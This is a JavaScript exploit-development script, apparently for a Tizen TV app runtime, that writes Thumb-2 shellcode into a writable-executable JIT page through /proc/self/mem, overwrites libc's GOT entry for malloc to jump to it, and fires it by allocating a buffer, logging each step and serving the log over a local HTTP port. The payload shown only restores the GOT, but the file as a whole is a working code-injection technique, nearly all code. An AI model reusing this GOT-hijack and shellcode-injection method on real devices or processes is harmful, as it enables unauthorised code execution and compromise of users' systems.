// v46: minimal 20-byte Thumb-2 shellcode — restore GOT + tail-call real malloc
// Proves the trigger survives (TizenBrew should NOT crash)
// Checkpoint sequence: A(addrs) → B(sc written) → C(GOT written, GOT-rb) → D(trigger sent) → E(trigger returned)
(function() {
  'use strict';
  var fs  = require('fs');
  var http = require('http');
  var PROBE = '/home/owner/share/tmp/sdk_tools/tbprobe46.txt';
  var PORT  = 8133;
  var GOT_OFFSET = 0x143014;

  function w(line) {
    try {
      var cur = ''; try { cur = fs.readFileSync(PROBE, 'utf8'); } catch(e){}
      fs.writeFileSync(PROBE, cur + line + '\n');
    } catch(e) {}
  }
  function hex(n) { return '0x' + (n >>> 0).toString(16); }

  // === Read addresses ===
  var maps = fs.readFileSync('/proc/self/maps', 'utf8');
  var libcBase = 0, jitPage = 0, jitSz = 0;
  maps.split('\n').forEach(function(line) {
    if (!libcBase && line.indexOf('libc-2.24.so') !== -1)
      libcBase = parseInt(line.split('-')[0], 16);
    var m = line.match(/^([0-9a-f]+)-([0-9a-f]+) rwxp/);
    if (m) { var sz = parseInt(m[2],16)-parseInt(m[1],16); if(sz>jitSz){jitSz=sz;jitPage=parseInt(m[1],16);} }
  });
  var gotAddr = libcBase + GOT_OFFSET;
  var wasByte = -1;
  try { wasByte = fs.readFileSync('/bin/wasutility')[0x7e4b]; } catch(e) {}
  w('[A] libcBase=' + hex(libcBase) + ' jit=' + hex(jitPage) + ' got=' + hex(gotAddr) + ' wasByte=0x' + (wasByte&0xff).toString(16));

  if (!libcBase || !jitPage) { w('FAIL:no_addrs'); serve(); return; }

  // === Open /proc/self/mem, read origMalloc ===
  var memfd = fs.openSync('/proc/self/mem', 'r+');
  var origBuf = new Buffer(4);
  fs.readSync(memfd, origBuf, 0, 4, gotAddr);
  var origMalloc = origBuf.readUInt32LE(0);
  w('[A1] memfd=' + memfd + ' origMalloc=' + hex(origMalloc));

  // === Build 20-byte shellcode ===
  // Offset  0: 4b 02   ldr r3, [pc, #8]  → origMalloc at offset 12
  // Offset  2: 4a 03   ldr r2, [pc, #12] → gotAddr    at offset 16
  // Offset  4: 13 60   str r3, [r2]       restore GOT
  // Offset  6: 18 47   bx  r3             tail-call real malloc (r0=size, lr=V8 caller)
  // Offset  8: 00 bf   nop
  // Offset 10: 00 bf   nop
  // Offset 12: [origMalloc LE 4B]
  // Offset 16: [gotAddr    LE 4B]
  var sc = [
    0x4b, 0x02,  // ldr r3, [pc, #8]
    0x4a, 0x03,  // ldr r2, [pc, #12]
    0x13, 0x60,  // str r3, [r2]
    0x18, 0x47,  // bx r3
    0x00, 0xbf,  // nop
    0x00, 0xbf,  // nop
    // origMalloc LE (offset 12)
    (origMalloc >>>  0) & 0xff,
    (origMalloc >>>  8) & 0xff,
    (origMalloc >>> 16) & 0xff,
    (origMalloc >>> 24) & 0xff,
    // gotAddr LE (offset 16)
    (gotAddr >>>  0) & 0xff,
    (gotAddr >>>  8) & 0xff,
    (gotAddr >>> 16) & 0xff,
    (gotAddr >>> 24) & 0xff,
  ];
  var SHELLCODE = new Buffer(sc);
  w('[A2] sc_len=' + SHELLCODE.length + ' sc_hex=' + SHELLCODE.slice(0,8).toString('hex'));

  // === Write shellcode to JIT page ===
  fs.writeSync(memfd, SHELLCODE, 0, SHELLCODE.length, jitPage);
  var rb = new Buffer(4);
  fs.readSync(memfd, rb, 0, 4, jitPage);
  w('[B] sc_written jit_rb=' + rb.toString('hex'));

  // === Overwrite GOT: malloc → jitPage | 1 (Thumb) ===
  var thumbTarget = (jitPage + 1) >>> 0;
  var gotBuf = new Buffer(4);
  gotBuf.writeUInt32LE(thumbTarget, 0);
  fs.writeSync(memfd, gotBuf, 0, 4, gotAddr);
  var gotRb = new Buffer(4);
  fs.readSync(memfd, gotRb, 0, 4, gotAddr);
  fs.closeSync(memfd);
  w('[C] got_written thumbTarget=' + hex(thumbTarget) + ' got_rb=' + hex(gotRb.readUInt32LE(0)));

  // === Trigger: allocate a Buffer → hits malloc → shellcode runs ===
  w('[D] trigger_firing');
  var x = new Buffer(16);
  w('[E] trigger_returned buf_len=' + x.length);

  // === Wait 2s then check GOT restored ===
  setTimeout(function() {
    try {
      var fd2 = fs.openSync('/proc/self/mem', 'r');
      var gr = new Buffer(4);
      fs.readSync(fd2, gr, 0, 4, gotAddr);
      fs.closeSync(fd2);
      w('[F] got_after_2s=' + hex(gr.readUInt32LE(0)) + ' origMalloc=' + hex(origMalloc));
    } catch(e) { w('[F] err=' + e.message); }
    serve();
  }, 2000);

  function serve() {
    var body = '';
    try { body = fs.readFileSync(PROBE, 'utf8'); } catch(e){ body='no probe\n'; }
    var srv = http.createServer(function(req,res){ res.end(body); });
    srv.listen(PORT, '127.0.0.1');
    srv.on('error', function(){});
    setInterval(function(){}, 60000);
  }
})();
